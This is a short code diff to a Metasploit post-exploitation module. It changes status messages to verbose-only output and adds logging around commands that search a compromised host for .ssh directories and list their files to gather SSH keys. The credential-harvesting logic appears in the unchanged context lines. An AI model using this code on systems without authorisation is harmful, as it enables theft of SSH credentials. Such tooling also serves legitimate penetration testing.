@@ -98,14 +98,14 @@ class MetasploitModule < Msf::Post
 
   def execute(cmd)
     verification_token = Rex::Text::rand_text_alpha(8)
-    print_status("Execute: #{cmd}")
+    vprint_status("Execute: #{cmd}")
     output = cmd_exec(cmd + " || echo #{verification_token}")
     return nil if output.include?(verification_token)
     return output
   end
 
   def cat_file(filename)
-    print_status("Download: #{filename}")
+    vprint_status("Download: #{filename}")
     output = read_file(filename)
     return output
   end
@@ -114,6 +114,7 @@ class MetasploitModule < Msf::Post
     keys = []
 
     #Look for .ssh folder, "~/" might not work everytime
+    vprint_status("Execute: /usr/bin/find / -maxdepth 3 -name .ssh")
     dirs = cmd_exec("/usr/bin/find / -maxdepth 3 -name .ssh").split("\n")
     ssh_base = ''
     dirs.each do |d|
@@ -127,6 +128,7 @@ class MetasploitModule < Msf::Post
     return [] if ssh_base == ''
 
     # List all the files under .ssh/
+    vprint_status("Execute: /bin/ls -a #{ssh_base}")
     files = cmd_exec("/bin/ls -a #{ssh_base}").chomp.split()
 
     files.each do |k|
